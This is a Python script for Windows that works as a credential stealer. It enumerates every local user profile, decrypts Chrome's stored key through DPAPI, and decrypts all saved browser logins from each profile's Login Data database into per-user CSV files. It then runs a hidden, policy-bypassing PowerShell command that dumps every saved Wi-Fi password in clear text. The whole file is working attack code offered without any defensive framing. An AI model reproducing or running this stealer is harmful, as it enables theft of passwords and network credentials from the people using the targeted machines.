import os
import re
import json
import base64
import socket
import sqlite3
from Cryptodome.Cipher import AES
import win32crypt # type: ignore
import shutil
import csv
import win32com.client
import threading 
import subprocess


def get_path(userprofile):
    userprofile = f"C:/Users/{userprofile}"
    return [os.path.normpath(f"{userprofile}/AppData/Local/Google/Chrome/User Data/Local State"), 
            os.path.normpath(f"{userprofile}/AppData/Local/Google/Chrome/User Data")]


def get_secret_key(chrome_path_local_state):
    try:
        with open(chrome_path_local_state, "r", encoding='utf-8') as f:
            local_state = json.load(f)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
    except Exception as e:
        return None
    

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)


def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)


def decrypt_password(ciphertext, secret_key):
    try:
        iv = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = generate_cipher(secret_key, iv)
        decrypted_pass = decrypt_payload(cipher, encrypted_password).decode()
        return decrypted_pass
    except Exception:
        return ""


def get_db_connection(chrome_path_login_db):
    try:
        shutil.copy2(chrome_path_login_db, "Loginvault.db")
        return sqlite3.connect("Loginvault.db")
    except Exception:
        return None


def get_pass_for_user(chrome_path, chrome_path_local_state, username, desktop_name):
    dcp = f"{desktop_name} data/{username}.txt"
    with open(dcp, mode='w', newline='', encoding='utf-8') as decrypt_password_file:
        csv_writer = csv.writer(decrypt_password_file, delimiter=',')
        csv_writer.writerow(["index", "url", "username", "password"])
        secret_key = get_secret_key(chrome_path_local_state)
        folders = [folder for folder in os.listdir(chrome_path) if re.search("^Profile*|^Default$", folder)]
        for folder in folders:
            chrome_path_login_db = os.path.normpath(f"{chrome_path}/{folder}/Login Data")
            conn = get_db_connection(chrome_path_login_db)
            if secret_key and conn:
                cursor = conn.cursor()
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                for index, login in enumerate(cursor.fetchall()):
                    url, username, ciphertext = login
                    if username and ciphertext:
                        decrypted_password = decrypt_password(ciphertext, secret_key)
                        csv_writer.writerow([index, url, username, decrypted_password])
                cursor.close()
                conn.close()
                os.remove("Loginvault.db")


def get_users():
    users = []
    try:
        objWMIService = win32com.client.Dispatch("WbemScripting.SWbemLocator")
        objSWbemServices = objWMIService.ConnectServer(".", "root/cimv2")
        colItems = objSWbemServices.ExecQuery("Select * from Win32_UserAccount")
        users = [objItem.Name for objItem in colItems]
    except Exception:
        pass
    return users


def job(user, desktop_name):
    paths = get_path(user)
    chrome_path, chrome_path_local_state = paths[1], paths[0]
    get_pass_for_user(chrome_path, chrome_path_local_state, user, desktop_name)


if __name__ == '__main__':
    desktop_name = socket.gethostname()
    os.makedirs(f"{desktop_name} data", exist_ok=True)

    path = 'C:/Users/'
    users = [folder for folder in os.listdir(path) if os.path.isdir(os.path.join(path, folder))]

    threads = []
    for user in users:
        thread = threading.Thread(target=job, args=(user, desktop_name))
        threads.append(thread)
        thread.start()

    command = '''powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command "& {(netsh wlan show profiles) | Select-String '\:(.+)$' | ForEach-Object {$name=$_.Matches.Groups[1].Value.Trim(); netsh wlan show profile name=$name key=clear | Select-String 'Key Content\s*:\s*(.+)$' | ForEach-Object {$pass=$_.Matches.Groups[1].Value.Trim(); [PSCustomObject]@{PROFILE_NAME=$name;PASSWORD=$pass}}} | Format-Table -AutoSize}"'''
    result = subprocess.run(command, shell=True, capture_output=True, text=True).stdout
    with open(f"{desktop_name} data/wifi.txt", 'w') as file:
        file.write(result)

    for thread in threads:
        thread.join()
